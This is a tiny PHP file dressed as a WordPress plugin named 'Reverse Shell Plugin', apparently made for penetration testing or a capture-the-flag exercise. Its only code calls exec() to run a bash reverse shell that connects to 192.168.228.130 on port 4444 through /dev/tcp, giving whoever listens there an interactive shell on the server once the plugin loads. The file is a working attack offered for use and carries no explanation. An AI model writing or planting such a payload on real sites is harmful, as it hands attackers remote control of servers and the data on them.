
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Michelle drucker
* Author URI: https://www.youtube.com/watch?v=dQw4w9WgXcQ
*/


exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.228.130/4444 0>&1"');

